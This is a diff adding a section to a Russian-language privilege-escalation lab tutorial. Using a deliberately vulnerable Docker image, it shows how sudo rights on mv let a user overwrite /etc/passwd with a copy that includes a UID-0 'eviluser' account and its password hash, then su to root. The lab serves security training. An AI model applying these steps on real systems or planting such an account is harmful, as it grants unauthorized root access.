@@ -62,3 +62,21 @@
 
 ![su eviluser](/pictures/pic6.png)
 
+Теперь давайте попробуем повысить привилегии, используя sudo на команду mv
+1.  Перейдите в каталог abuse_sudo/sudo_on_bin/write_file/abuse_mv
+2.  Соберите уязвимый образ `docker build -t abuse_mv .`
+3.  Запустите контейнер из собранного образа и перейдите в его оболочку с помощью команды
+    `docker run -it abuse_mv /bin/bash`
+4.  Выполните `sudo -l`
+
+![sudo -l result](/pictures/pic7.png)
+
+5. Мы видим, что нам доступно выполнение через sudo команды mv. Выстроим следующий вектор повышения привилегий: создадим копию файла /etc/passwd, добавим в нее своего пользователя с правами root, заменим с помощью команды mv оригинальный /etc/passwd нашей копией. Выполните следующие шаги:
+* Выполните в контейнере команду `cp /etc/passwd passwd_copy`
+* Внесите в passwd_copy строку eviluser:$1$eviluser$eIaLEOmpQR3YjlJE1f/En.:0:0:/root/root:/bin/bash
+* Выполните команду `sudo mv passwd_copy /etc/passwd`
+На скриншоте ниже продемонстрирован перезаписанный командой mv файл /etc/passwd
+
+![sudo -l result](/pictures/pic8.png)
+
+* Выполните команду su eviluser, вы получите сессию пользователя с правами root
